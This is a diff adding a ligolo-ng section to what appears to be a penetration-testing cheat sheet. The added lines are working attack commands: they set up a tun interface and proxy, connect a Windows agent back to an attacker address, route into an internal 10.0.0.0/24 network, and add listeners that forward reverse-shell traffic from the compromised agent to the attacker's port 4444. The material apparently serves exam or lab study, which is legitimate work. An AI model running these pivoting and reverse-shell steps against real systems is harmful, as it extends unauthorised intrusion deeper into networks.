@@ -1133,6 +1133,35 @@ windows -i 3
 listen 127.0.0.1:4455 172.16.4.11:445           (forward localhost to remote SMB)
 listen 192.168.244.7:9998 172.16.244.217:445
 ```
+4. ligolo-ng
+```
+1. setting up a pivot point with ligolo-ng:
+
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+./proxy -selfcert 
+.\agent.exe -connect 192.168.45.158:11601 -ignore-cert
+
+session
+	- 1
+	- ifconfig
+	- start			(run this after adding the route)
+	
+sudo ip route add 10.0.0.0/24 dev ligolo
+ip route list
+	- should show "10.0.0.0/24 dev ligolo scope link"
+
+
+2. setting up reverse shells/servers on the internal network (ligolo listeners):
+	- listeners on agents forward traffic out to the attacker
+
+listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:4444
+	- forward traffic sent to agent:2345 to kali:4444
+	- send traffic to agent:2345 and it will be forwarded to kali:4444
+
+listener_list
+```
 
 
 **The Metasploit Framework:**
